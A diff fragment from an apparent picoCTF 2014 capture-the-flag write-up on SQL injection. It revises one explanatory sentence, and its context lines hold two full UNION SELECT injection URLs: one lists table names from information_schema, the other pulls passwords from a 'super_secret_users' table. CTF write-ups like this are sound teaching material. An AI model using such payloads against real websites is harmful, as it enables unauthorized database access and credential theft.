@@ -12,7 +12,7 @@ This second query is the farthest offset that still gives us empty strings(valid
 3.
 http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+table_name+AS+username,+table_name+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+information_schema.tables+WHERE+version+=+10+LIMIT+40,+1&debug=1
 
-This third query gives us the table name "super_secret_users" for username (I'm not sure why the previous query didn't work and there is an offset of 1) Also note that version isn't required here
+This third query gives us the table name "super_secret_users" for username (I'm not sure why the previous query didn't work and display_name is where username should be) Also note that version isn't required here
 
 4.
 http://web2014.picoctf.com/injection3/lookup_user.php?id=-1+UNION+SELECT+password+AS+username,+password+AS+display_name,+null+AS+location,+null+AS+email,+null+AS+five,+null+AS+six,+null+AS+seven+FROM+super_secret_users+LIMIT+1&debug=1
